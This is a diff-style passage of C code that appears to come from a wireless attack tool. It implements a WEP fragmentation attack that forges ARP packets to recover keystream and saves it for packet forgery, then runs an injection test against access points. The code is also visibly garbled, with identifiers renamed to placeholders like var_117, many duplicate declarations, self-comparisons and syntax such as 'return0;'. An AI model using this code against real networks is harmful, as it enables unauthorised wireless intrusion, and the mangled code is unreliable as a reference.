+        memcpy(iv, packet+z, 4);
+
+        xor_keystream(prga, snap_header, prga_len);
+
+        while(again == 2)
+        {
+            again = 0;
+
+            arplen=60;
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
+
+            if ((round % 2) == 1)
+            {
+                PCT; printf("Trying a LLC NULL packet\n");
+                memset(h80211+24, '\x00', 39);
+                arplen=63;
+            }
+
+            acksgot=0;
+            var_100=(arplen-24)/(prga_len-4);
+            if( (arplen-24)%(prga_len-4) != 0 )
+                var_100++;
+
+            PCT; printf("Sending fragmented packet\n");
+            send_fragments(h80211, arplen, iv, prga, prga_len-4, 0);
+
+
+
+            gettimeofday( &tv, NULL );
+
+
+            while (!var_117)
+            {
+                var_117 = read_packet(packet, sizeof(packet), NULL);
+                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+                if ( ( packet[0] & 0x80 ) == 0x80 )
+                    z+=2;
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                    {
+                        acksgot++;
+                    }
+                    continue;
+                }
+
+                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) )
+                {
+                    if ( (packet[1] & 2) )
+                    {
+                        if (! memcmp(opt.r_dmac, packet+4, 6))
+                        {
+                            if (! memcmp(opt.r_smac, packet+16, 6))
+                            {
+                                if (var_117-z < 66)
+                                {
+
+                                    PCT; printf("Got RELAYED packet!!\n");
+                                    var_117 = 1;
+                                    isrelay = 1;
+                                }
+                            }
+                        }
+                    }
+                }
+
+
+
+                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
+                {
+                    PCT; printf( "Got a deauthentication packet!\n" );
+                    read_sleep( 5000000 );
+                }
+
+
+
+                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
+                {
+                    PCT; printf( "Got a disassociation packet!\n" );
+                    read_sleep( 5000000 );
+                }
+
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 100000 && acksgot >0 && acksgot < var_100 )
+                {
+                    PCT; printf("Not enough acks, repeating...\n");
+                    again = 2;
+                    break;
+                }
+
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 1500000 && !var_117)
+                {
+                    PCT; printf("No answer, repeating...\n");
+                    round++;
+                    again = 2;
+                    if (round > 10)
+                    {
+                        PCT; printf("Still nothing, trying another packet...\n");
+                        again = 1;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if(again == 1) continue;
+
+        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 60);
+        if (var_117-z == 44)
+        {
+
+
+        }
+        if (var_117-z == 47)
+        {
+
+
+            memset(h80211+24, '\x00', 39);
+        }
+
+        if (! isrelay)
+        {
+
+            unsigned char ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
+
+
+
+            memcpy(ct+16, packet+16, 6);
+            memcpy(ct+22, opt.r_dip, 4);
+
+
+            memcpy(ct+26, opt.r_smac, 6);
+            memcpy(ct+32, opt.r_sip, 4);
+
+
+            memcpy(prga, packet+z+4, 36);
+            xor_keystream(prga, ct, 36);
+        }
+        else
+        {
+            memcpy(prga, packet+z+4, 36);
+            xor_keystream(prga, h80211+24, 36);
+        }
+
+        memcpy(iv, packet+z, 4);
+        round = 0;
+        again = 2;
+        while(again == 2)
+        {
+            again = 0;
+
+            PCT; printf("Trying to get 384 bytes of a keystream\n");
+
+            arplen=408;
+
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, arplen);
+            if ((round % 2) == 1)
+            {
+                PCT; printf("Trying a LLC NULL packet\n");
+                memset(h80211+24, '\x00', arplen+8);
+                arplen+=32;
+            }
+
+            acksgot=0;
+            var_100=(arplen-24)/32;
+            if( (arplen-24)%32 != 0 )
+                var_100++;
+
+            send_fragments(h80211, arplen, iv, prga, 32, 0);
+
+
+
+            gettimeofday( &tv, NULL );
+
+            var_117=0;
+            while (!var_117)
+            {
+                var_117 = read_packet(packet, sizeof(packet), NULL);
+                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+                if ( ( packet[0] & 0x80 ) == 0x80 )
+                    z+=2;
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                        acksgot++;
+                    continue;
+                }
+
+                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) )
+                {
+                    if ( (packet[1] & 2) )
+                    {
+                        if (! memcmp(opt.r_dmac, packet+4, 6))
+                        {
+                            if (! memcmp(opt.r_smac, packet+16, 6))
+                            {
+                                if (var_117-z > 376 && var_117-z < 476)
+                                {
+
+                                    PCT; printf("Got RELAYED packet!!\n");
+                                    var_117 = 1;
+                                    isrelay = 1;
+                                }
+                            }
+                        }
+                    }
+                }
+
+
+
+                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
+                {
+                    PCT; printf( "Got a deauthentication packet!\n" );
+                    read_sleep( 5000000 );
+                }
+
+
+
+                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
+                {
+                    PCT; printf( "Got a disassociation packet!\n" );
+                    read_sleep( 5000000 );
+                }
+
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 100000 && acksgot >0 && acksgot < var_100 )
+                {
+                    PCT; printf("Not enough acks, repeating...\n");
+                    again = 2;
+                    break;
+                }
+
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 1500000 && !var_117)
+                {
+                    PCT; printf("No answer, repeating...\n");
+                    round++;
+                    again = 2;
+                    if (round > 10)
+                    {
+                        PCT; printf("Still nothing, trying another packet...\n");
+                        again = 1;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if(again == 1) continue;
+
+        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 408);
+        if (var_117-z == 392)
+        {
+
+
+        }
+        if (var_117-z == 424)
+        {
+
+
+            memset(h80211+24, '\x00', 416);
+        }
+
+        memcpy(iv, packet+z, 4);
+        memcpy(prga, packet+z+4, 384);
+        xor_keystream(prga, h80211+24, 384);
+
+        round = 0;
+        again = 2;
+        while(again == 2)
+        {
+            again = 0;
+
+            PCT; printf("Trying to get 1500 bytes of a keystream\n");
+
+            make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, 1500);
+            arplen=1500;
+            if ((round % 2) == 1)
+            {
+                PCT; printf("Trying a LLC NULL packet\n");
+                memset(h80211+24, '\x00', 1508);
+                arplen+=32;
+            }
+
+            acksgot=0;
+            var_100=(arplen-24)/300;
+            if( (arplen-24)%300 != 0 )
+                var_100++;
+
+            send_fragments(h80211, arplen, iv, prga, 300, 0);
+
+
+
+            gettimeofday( &tv, NULL );
+
+            var_117=0;
+            while (!var_117)
+            {
+                var_117 = read_packet(packet, sizeof(packet), NULL);
+                z = ( ( packet[1] & 3 ) != 3 ) ? 24 : 30;
+                if ( ( packet[0] & 0x80 ) == 0x80 )
+                    z+=2;
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                        acksgot++;
+                    continue;
+                }
+
+                if ((packet[0] & 0x08) && (( packet[1] & 0x40 ) == 0x40) )
+                {
+                    if ( (packet[1] & 2) )
+                    {
+                        if (! memcmp(opt.r_dmac, packet+4, 6))
+                        {
+                            if (! memcmp(opt.r_smac, packet+16, 6))
+                            {
+                                if (var_117-z > 1472)
+                                {
+
+                                    PCT; printf("Got RELAYED packet!!\n");
+                                    var_117 = 1;
+                                    isrelay = 1;
+                                }
+                            }
+                        }
+                    }
+                }
+
+
+
+                if( packet[0] == 0xC0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
+                {
+                    PCT; printf( "Got a deauthentication packet!\n" );
+                    read_sleep( 5000000 );
+                }
+
+
+
+                if( packet[0] == 0xA0 && memcmp( packet+4, opt.r_smac, 6) == 0 )
+                {
+                    PCT; printf( "Got a disassociation packet!\n" );
+                    read_sleep( 5000000 );
+                }
+
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 100000 && acksgot >0 && acksgot < var_100 )
+                {
+                    PCT; printf("Not enough acks, repeating...\n");
+                    again = 2;
+                    break;
+                }
+
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 1500000 && !var_117)
+                {
+                    PCT; printf("No answer, repeating...\n");
+                    round++;
+                    again = 2;
+                    if (round > 10)
+                    {
+                        printf("Still nothing, quitting with 384 bytes? [y/n] \n");
+                        fflush( stdout );
+                        var_122=0;
+                        while(!var_122) var_122 = scanf( "%s", tmpbuf );
+
+                        printf( "\n" );
+
+                        if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )
+                            again = 3;
+                        else
+                            again = 1;
+                    }
+                    break;
+                }
+            }
+        }
+
+        if(again == 1) continue;
+
+        if(again == 3) length = 408;
+        else length = 1500;
+
+        make_arp_request(h80211, opt.f_bssid, opt.r_smac, opt.r_dmac, opt.r_sip, opt.r_dip, length);
+        if (var_117 == length+8+z)
+        {
+
+
+        }
+        if (var_117 == length+16+z)
+        {
+
+
+            memset(h80211+24, '\x00', length+8);
+        }
+
+        if(again != 3)
+        {
+            memcpy(iv, packet+z, 4);
+            memcpy(prga, packet+z+4, length);
+            xor_keystream(prga, h80211+24, length);
+        }
+
+        lt = localtime( (const time_t *) &tv.tv_sec );
+
+        memset( strbuf, 0, sizeof( strbuf ) );
+        snprintf( strbuf, sizeof( strbuf ) - 1,
+                  "fragment-%02d%02d-%02d%02d%02d.xor",
+                  lt->tm_mon + 1, lt->tm_mday,
+                  lt->tm_hour, lt->tm_min, lt->tm_sec );
+        save_prga(strbuf, iv, prga, length);
+
+        printf( "Saving keystream in %s\n", strbuf );
+        printf("Now you can build a packet with packetforge-ng out of that %d bytes keystream\n", length);
+
+        done=1;
+
+    }
+
+    return0;
+}
+
+int fn_100(unsigned char* packet, int var_117)
+{
+    int var_122=0, var_117=0, var_101=0, var_101=0, var_101=0, var_101=0;
+    unsigned char bssid[6];
+
+    memcpy(bssid, packet+16, 6);
+    var_101 = 22;
+    var_101+= 12;
+    do
+    {
+        var_101 += var_101 + 2;
+        var_101 = packet[var_101];
+        var_101 = packet[var_101+1];
+    } while(var_101 != 3 && var_101 < var_117-2);
+
+    if(var_101 != 3) return -1;
+    if(var_101 != 1) return -1;
+    if(var_101+2+var_101 > var_117) return -1;
+
+    var_101 = packet[var_101+2];
+
+    var_101=0;
+
+    var_101 = 22;
+    var_101+= 12;
+    do
+    {
+        var_101 += var_101 + 2;
+        var_101 = packet[var_101];
+        var_101 = packet[var_101+1];
+    } while(var_101 != 0 && var_101 < var_117-2);
+
+    if(var_101 != 0) return -1;
+    if(var_101 > 250) var_101 = 250;
+    if(var_101+2+var_101 > var_117) return -1;
+
+    for(var_122=0; var_122<20; var_122++)
+    {
+        if( ap[var_122].set)
+        {
+            if( memcmp(bssid, ap[var_122].bssid, 6) == 0 )
+            {
+                if(packet[0] == 0x50 && !ap[var_122].found)
+                {
+                    ap[var_122].found++;
+                }
+                if(ap[var_122].chan == 0) ap[var_122].chan=var_101;
+                break;
+            }
+        }
+        if(ap[var_122].set == 0)
+        {
+            for(var_117=0; var_117<var_101; var_117++)
+            {
+                if(packet[var_101+2+var_117] < 32 || packet[var_101+2+var_117] > 127)
+                {
+                    return -1;
+                }
+            }
+
+            ap[var_122].set = 1;
+            ap[var_122].len = var_101;
+            memcpy(ap[var_122].essid, packet+var_101+2, var_101);
+            ap[var_122].essid[var_101] = '\0';
+            memcpy(ap[var_122].bssid, bssid, 6);
+            ap[var_122].chan = var_101;
+            if(packet[0] == 0x50) ap[var_122].found++;
+            return 0;
+        }
+    }
+    return -1;
+}
+
+static int fn_101(char *iface, char *ip, const int var_105)
+{
+ char *host;
+ char *ptr;
+ int var_111 = -1;
+ struct struct_122 addr;
+
+ host = strdup(iface);
+ if (!host)
+  return -1;
+
+ ptr = strchr(host, ':');
+ if (!ptr)
+  goto out;
+
+ *ptr++ = 0;
+
+ if (!inet_aton(host, (struct struct_122 *)&addr))
+  goto out;
+
+ if(strlen(host) > 15)
+        {
+            var_111 = -1;
+            goto out;
+        }
+ strncpy(ip, host, var_105);
+ var_111 = atoi(ptr);
+        if(var_111 <= 0) var_111 = -1;
+
+out:
+ free(host);
+ return var_111;
+}
+
+void fn_105(unsigned char* packet, int var_117)
+{
+    int var_122=0;
+
+    for(var_122=0; var_122<var_117; var_122++)
+    {
+        if(var_122>0 && var_122%4 == 0)printf(" ");
+        if(var_122>0 && var_122%16 == 0)printf("\n");
+        printf("%02X ", packet[var_122]);
+    }
+    printf("\n\n");
+}
+
+struct struct_110 {
+ uint8_t nh_type;
+ uint32_t nh_len;
+ uint8_t nh_data[0];
+} __packed;
+
+int fn_107(const char* ip_str, const short var_111)
+{
+    int sock, var_122;
+    struct struct_108 s_in;
+    int var_110 = 1024;
+    unsigned char packet[var_110];
+    struct struct_112 tv, tv2, tv3;
+    int var_117 = 0;
+    int times[30];
+    int var_117, avg, max, var_117;
+    struct struct_110 nh;
+
+    tv3.tv_sec=0;
+    tv3.tv_usec=1;
+
+    s_in.sin_family = PF_INET;
+    s_in.sin_port = htons(var_111);
+    if (!inet_aton(ip_str, &s_in.sin_addr))
+            return -1;
+
+    if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
+            return -1;
+
+
+    if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )
+    {
+        perror( "fcntl(O_NONBLOCK) failed" );
+        return1;
+    }
+
+    gettimeofday( &tv, NULL );
+
+    while 1
+    {
+        if (connect(sock, (struct struct_111*) &s_in, sizeof(s_in)) == -1)
+        {
+            if(errno != EINPROGRESS && errno != EALREADY)
+            {
+                perror("connect");
+                close(sock);
+
+                printf("Failed to connect\n");
+
+                return -1;
+            }
+        }
+        else
+        {
+            gettimeofday( &tv2, NULL );
+            break;
+        }
+
+        gettimeofday( &tv2, NULL );
+
+        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 3000000)
+        {
+            printf("Connection timed out\n");
+            close(sock);
+            return-1;
+        }
+        usleep(10);
+    }
+
+    PCT; printf("TCP connection successful\n");
+
+
+    memset(&nh, 0, sizeof(nh));
+
+    nh.nh_type = 2;
+    nh.nh_len = htonl(0);
+
+    if (send(sock, &nh, sizeof(nh), 0) != sizeof(nh))
+    {
+        perror("send");
+        return -1;
+    }
+
+    gettimeofday( &tv, NULL );
+    var_122=0;
+
+    while 1
+    {
+        var_117 = read(sock, &nh, sizeof(nh));
+
+        if(var_117 == -1)
+        {
+            if( errno != EAGAIN )
+            {
+                perror("read");
+                return -1;
+            }
+        }
+
+        if( (unsigned)var_117 == sizeof(nh))
+        {
+            var_117 = ntohl(nh.nh_len);
+            if( nh.nh_type == 1 && var_122==0 )
+            {
+                var_122=1;
+                var_117 = read(sock, packet, var_117);
+                if(var_117 == var_117)
+                {
+                    var_122=2;
+                    break;
+                }
+                else
+                {
+                    var_122=0;
+                }
+            }
+            else
+            {
+                var_117 = read(sock, packet, var_117);
+            }
+        }
+
+        gettimeofday( &tv2, NULL );
+
+        if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 1000000)
+        {
+            break;
+        }
+        if(var_117 == -1)
+            usleep(10);
+    }
+
+    if(var_122==2)
+    {
+        PCT; printf("airserv-ng found\n");
+    }
+    else
+    {
+        PCT; printf("airserv-ng NOT found\n");
+    }
+
+    close(sock);
+
+    for(var_122=0; var_122<30; var_122++)
+    {
+        if ((sock = socket(s_in.sin_family, SOCK_STREAM, IPPROTO_TCP)) == -1)
+                return -1;
+
+
+        if( fcntl( sock, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return1;
+        }
+
+        usleep(1000);
+
+        gettimeofday( &tv, NULL );
+
+        while 1
+        {
+            if (connect(sock, (struct struct_111*) &s_in, sizeof(s_in)) == -1)
+            {
+                if(errno != EINPROGRESS && errno != EALREADY)
+                {
+                    perror("connect");
+                    close(sock);
+
+                    printf("Failed to connect\n");
+
+                    return -1;
+                }
+            }
+            else
+            {
+                gettimeofday( &tv2, NULL );
+                break;
+            }
+
+            gettimeofday( &tv2, NULL );
+
+            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > 1000000)
+            {
+                break;
+            }
+
+            select(1, NULL, NULL, NULL, &tv3);
+        }
+        times[var_122] = ((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec));
+        printf( "\r%d/%d\r", var_122, 30);
+        fflush(stdout);
+        close(sock);
+    }
+
+    var_117 = INT_MAX;
+    avg = 0;
+    max = 0;
+
+    for(var_122=0; var_122<30; var_122++)
+    {
+        if(times[var_122] < var_117) var_117 = times[var_122];
+        if(times[var_122] > max) max = times[var_122];
+        avg += times[var_122];
+    }
+    avg /= 30;
+
+    PCT; printf("ping %s:%d (min/avg/max): %.3fms/%.3fms/%.3fms\n", ip_str, var_111, var_117/1000.0, avg/1000.0, max/1000.0);
+
+    return 0;
+}
+
+int fn_111()
+{
+    unsigned char packet[4096];
+    struct struct_112 tv, tv2, tv3;
+    int var_117=0, var_122=0, var_117=0, var_117=0;
+    int var_117=0, var_117=0, var_117=0;
+    int var_117=0, var_117=0;
+    unsigned int var_117, avg, max;
+    int var_122=0;
+    float avg2;
+    struct struct_116 ri;
+    int var_117=200;
+    unsigned char nulldata[1024];
+
+    if(opt.port_out > 0)
+    {
+        var_117 += 200;
+        PCT; printf("Testing connection to injection device %s\n", opt.iface_out);
+        var_122 = tcp_test(opt.ip_out, opt.port_out);
+        if(var_122 != 0)
+        {
+            return1;
+        }
+        printf("\n");
+
+
+        var_122 = wi_open(opt.iface_out);
+        if (!var_122)
+            return 1;
+        printf("\n");
+        dev.fd_out = wi_fd(var_122);
+        wi_get_mac(var_122, dev.mac_out);
+        if(opt.s_face == NULL)
+        {
+            var_122 = var_122;
+            dev.fd_in = dev.fd_out;
+
+
+            dev.arptype_in = dev.arptype_out;
+            wi_get_mac(var_122, dev.mac_in);
+        }
+    }
+
+    if(opt.s_face && opt.port_in > 0)
+    {
+        var_117 += 200;
+        PCT; printf("Testing connection to capture device %s\n", opt.s_face);
+        var_122 = tcp_test(opt.ip_in, opt.port_in);
+        if(var_122 != 0)
+        {
+            return1;
+        }
+        printf("\n");
+
+
+        var_122 = wi_open(opt.s_face);
+        if (!var_122)
+            return 1;
+        dev.fd_in = wi_fd(var_122);
+        wi_get_mac(var_122, dev.mac_in);
+        printf("\n");
+    }
+    else if(opt.s_face && opt.port_in <= 0)
+    {
+        var_122 = wi_open(opt.s_face);
+        if (!var_122)
+            return 1;
+        dev.fd_in = wi_fd(var_122);
+        wi_get_mac(var_122, dev.mac_in);
+        printf("\n");
+    }
+
+    if(opt.port_in <= 0)
+    {
+
+        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
+        {
+            perror( "fcntl(O_NONBLOCK) failed" );
+            return1;
+        }
+    }
+
+    if(getnet(NULL, 0, 0) != 0)
+        return 1;
+
+    srand( time( NULL ) );
+
+    memset(ap, '\0', 20*sizeof(struct struct_117));
+
+    var_117 = strlen(opt.r_essid);
+    if( var_117 > 250) var_117 = 250;
+
+    if( var_117 > 0 )
+    {
+        ap[0].set = 1;
+        ap[0].found = 0;
+        ap[0].len = var_117;
+        memcpy(ap[0].essid, opt.r_essid, var_117);
+        ap[0].essid[var_117] = '\0';
+        memcpy(ap[0].bssid, opt.r_bssid, 6);
+        var_117++;
+    }
+
+    if(opt.bittest)
+        set_bitrate(var_122, 1000000);
+
+    PCT; printf("Trying broadcast probe requests...\n");
+
+    memcpy(h80211, "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC" "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00", 24);
+
+    var_117 = 24;
+
+    h80211[24] = 0x00;
+    h80211[25] = 0x00;
+
+    var_117 += 2;
+
+    memcpy(h80211+var_117, "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C", 16);
+
+    var_117 += 16;
+
+    var_117=0;
+    var_117=0;
+    for(var_122=0; var_122<3; var_122++)
+    {
+
+
+
+        opt.r_smac[0] = 0x00;
+        opt.r_smac[1] = rand() & 0xFF;
+        opt.r_smac[2] = rand() & 0xFF;
+        opt.r_smac[3] = rand() & 0xFF;
+        opt.r_smac[4] = rand() & 0xFF;
+        opt.r_smac[5] = rand() & 0xFF;
+
+        memcpy(h80211+10, opt.r_smac, 6);
+
+        send_packet(h80211, var_117);
+
+        gettimeofday( &tv, NULL );
+
+        while 1
+        {
+            var_117 = read_packet(packet, sizeof(packet), &ri);
+
+            if (packet[0] == 0x50 )
+            {
+                if (! memcmp(opt.r_smac, packet+4, 6))
+                {
+                    if(grab_essid(packet, var_117) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
+                    {
+                        var_117++;
+                    }
+                    if(!var_117)
+                    {
+                        PCT; printf("Injection is working!\n");
+                        if(opt.fast) return 0;
+                        var_117=1;
+                        var_117++;
+                    }
+                }
+            }
+
+            if (packet[0] == 0x80 )
+            {
+                if(grab_essid(packet, var_117) == 0 && (!memcmp(opt.r_bssid, NULL_MAC, 6)))
+                {
+                    var_117++;
+                }
+            }
+
+            gettimeofday( &tv2, NULL );
+            if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (3*var_117*1000))
+            {
+                break;
+            }
+        }
+    }
+    if(var_117 == 0)
+    {
+        PCT; printf("No Answer...\n");
+    }
+
+    PCT; printf("Found %d AP%c\n", var_117, ((var_117 == 1) ? ' ' : 's' ) );
+
+    if(var_117 > 0)
+    {
+        printf("\n");
+        PCT; printf("Trying directed probe requests...\n");
+    }
+
+    for(var_122=0; var_122<var_117; var_122++)
+    {
+        if(wi_get_channel(var_122) != ap[var_122].chan)
+        {
+            wi_set_channel(var_122, ap[var_122].chan);
+        }
+
+        if(wi_get_channel(var_122) != ap[var_122].chan)
+        {
+            wi_set_channel(var_122, ap[var_122].chan);
+        }
+
+        PCT; printf("%02X:%02X:%02X:%02X:%02X:%02X - channel: %d - \'%s\'\n", ap[var_122].bssid[0], ap[var_122].bssid[1],
+                    ap[var_122].bssid[2], ap[var_122].bssid[3], ap[var_122].bssid[4], ap[var_122].bssid[5], ap[var_122].chan, ap[var_122].essid);
+
+        ap[var_122].found=0;
+        var_117 = INT_MAX;
+        max = 0;
+        avg = 0;
+        avg2 = 0;
+
+        memcpy(h80211, "\x40\x00\x00\x00\xFF\xFF\xFF\xFF\xFF\xFF\xCC\xCC\xCC\xCC\xCC\xCC" "\xFF\xFF\xFF\xFF\xFF\xFF\x00\x00", 24);
+
+        var_117 = 24;
+
+        h80211[24] = 0x00;
+        h80211[25] = ap[var_122].len;
+        memcpy(h80211+var_117+2, ap[var_122].essid, ap[var_122].len);
+
+        var_117 += ap[var_122].len+2;
+
+        memcpy(h80211+var_117, "\x01\x04\x02\x04\x0B\x16\x32\x08\x0C\x12\x18\x24\x30\x48\x60\x6C", 16);
+
+        var_117 += 16;
+
+        for(var_117=0; var_117<30; var_117++)
+        {
+
+
+
+            opt.r_smac[0] = 0x00;
+            opt.r_smac[1] = rand() & 0xFF;
+            opt.r_smac[2] = rand() & 0xFF;
+            opt.r_smac[3] = rand() & 0xFF;
+            opt.r_smac[4] = rand() & 0xFF;
+            opt.r_smac[5] = rand() & 0xFF;
+
+
+            memcpy(h80211+10, opt.r_smac, 6);
+
+            send_packet(h80211, var_117);
+            usleep(10);
+
+
+            memcpy(nulldata, "\xB4\x00\x4E\x04\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC", 16);
+            memcpy(nulldata+4, ap[var_122].bssid, 6);
+            memcpy(nulldata+10, opt.r_smac, 6);
+
+            send_packet(nulldata, 16);
+            usleep(10);
+
+
+            memcpy(nulldata, "\x48\x01\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xE0\x1B", 24);
+            memcpy(nulldata+4, ap[var_122].bssid, 6);
+            memcpy(nulldata+10, opt.r_smac, 6);
+            memcpy(nulldata+16, ap[var_122].bssid, 6);
+
+            send_packet(nulldata, 24);
+            usleep(10);
+
+
+            memcpy(nulldata, "\xB0\x00\x3A\x01\xBB\xBB\xBB\xBB\xBB\xBB\xCC\xCC\xCC\xCC\xCC\xCC" "\xBB\xBB\xBB\xBB\xBB\xBB\xB0\x00\x00\x00\x01\x00\x00\x00", 30);
+            memcpy(nulldata+4, ap[var_122].bssid, 6);
+            memcpy(nulldata+10, opt.r_smac, 6);
+            memcpy(nulldata+16, ap[var_122].bssid, 6);
+
+            send_packet(nulldata, 30);
+
+
+            gettimeofday( &tv, NULL );
+
+            printf( "\r%2d/%2d: %3d%%\r", ap[var_122].found, var_117+1, ((ap[var_122].found*100)/(var_117+1)));
+            fflush(stdout);
+            while 1
+            {
+                var_117 = read_packet(packet, sizeof(packet), &ri);
+
+                if (packet[0] == 0x50 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                    {
+                        if(! memcmp(ap[var_122].bssid, packet+16, 6))
+                        {
+                            gettimeofday( &tv3, NULL);
+                            ap[var_122].ping[var_117] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
+                            if(!var_117)
+                            {
+                                if(opt.fast)
+                                {
+                                    PCT; printf("Injection is working!\n\n");
+                                    return 0;
+                                }
+                                var_117++;
+                            }
+                            ap[var_122].found++;
+                            if((signed)ri.ri_power > -200)
+                                ap[var_122].pwr[var_117] = (signed)ri.ri_power;
+                            break;
+                        }
+                    }
+                }
+
+                if (packet[0] == 0xC4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                    {
+                        gettimeofday( &tv3, NULL);
+                        ap[var_122].ping[var_117] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
+                        if(!var_117)
+                        {
+                            if(opt.fast)
+                            {
+                                PCT; printf("Injection is working!\n\n");
+                                return 0;
+                            }
+                            var_117++;
+                        }
+                        ap[var_122].found++;
+                        if((signed)ri.ri_power > -200)
+                            ap[var_122].pwr[var_117] = (signed)ri.ri_power;
+                        break;
+                    }
+                }
+
+                if (packet[0] == 0xD4 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                    {
+                        gettimeofday( &tv3, NULL);
+                        ap[var_122].ping[var_117] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
+                        if(!var_117)
+                        {
+                            if(opt.fast)
+                            {
+                                PCT; printf("Injection is working!\n\n");
+                                return 0;
+                            }
+                            var_117++;
+                        }
+                        ap[var_122].found++;
+                        if((signed)ri.ri_power > -200)
+                            ap[var_122].pwr[var_117] = (signed)ri.ri_power;
+                        break;
+                    }
+                }
+
+                if (packet[0] == 0xB0 )
+                {
+                    if (! memcmp(opt.r_smac, packet+4, 6))
+                    {
+                        if (! memcmp(packet+10, packet+16, 6))
+                        {
+                            gettimeofday( &tv3, NULL);
+                            ap[var_122].ping[var_117] = ((tv3.tv_sec*1000000 - tv.tv_sec*1000000) + (tv3.tv_usec - tv.tv_usec));
+                            if(!var_117)
+                            {
+                                if(opt.fast)
+                                {
+                                    PCT; printf("Injection is working!\n\n");
+                                    return 0;
+                                }
+                                var_117++;
+                            }
+                            ap[var_122].found++;
+                            if((signed)ri.ri_power > -200)
+                                ap[var_122].pwr[var_117] = (signed)ri.ri_power;
+                            break;
+                        }
+                    }
+                }
+
+                gettimeofday( &tv2, NULL );
+                if (((tv2.tv_sec*1000000 - tv.tv_sec*1000000) + (tv2.tv_usec - tv.tv_usec)) > (var_117*1000))
+                {
+                    break;
+                }
+                usleep(10);
+            }
+            printf( "\r%2d/%2d: %3d%%\r", ap[var_122].found, var_117+1, ((ap[var_122].found*100)/(var_117+1)));
+            fflush(stdout);
+        }
+        for(var_117=0; var_117<30; var_117++)
+        {
+            if(ap[var_122].ping[var_117] > 0)
+            {
+                if(ap[var_122].ping[var_117] > max) max = ap[var_122].ping[var_117];
+                if(ap[var_122].ping[var_117] < var_117) var_117 = ap[var_122].ping[var_117];
+                avg += ap[var_122].ping[var_117];
+                avg2 += ap[var_122].pwr[var_117];
+            }
+        }
+        if(ap[var_122].found > 0)
+        {
+            avg /= ap[var_122].found;
+            avg2 /= ap[var_122].found;
+            PCT; printf("Ping (min/avg/max): %.3fms/%.3fms/%.3fms Power: %.2f\n", (var_117/1000.0), (avg/1000.0), (max/1000.0), avg2);
+        }
+        PCT; printf("%2d/%2d: %3d%%\n\n", ap[var_122].found, 30, ((ap[var_122].found*100)/30));
+
+        if(!var_117 && var_117)
+        {
